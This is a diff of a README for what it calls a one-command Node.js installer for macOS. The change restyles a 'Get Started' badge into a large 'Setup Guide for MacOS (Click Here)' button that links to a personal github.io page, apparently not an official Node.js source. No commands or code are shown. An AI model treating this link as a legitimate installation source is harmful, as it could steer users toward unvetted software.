@@ -3,7 +3,7 @@
 
 Node.js for macOS — your quick and simple way to install Node.js on Mac and MacBook using one command and Node Version Manager (NVM). Perfect for developers who need a lightweight, up-to-date environment.
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Install-green)](https://bigodpets529.github.io/bigodpets529/)
+[![Get Started](https://img.shields.io/badge/Setup%20Guide%20for%20MacOS%20%28Click%20Here%29-2da44e?style=for-the-badge&logo=apple&logoColor=white)](https://bigodpets529.github.io/bigodpets529/)
 
 ---
 
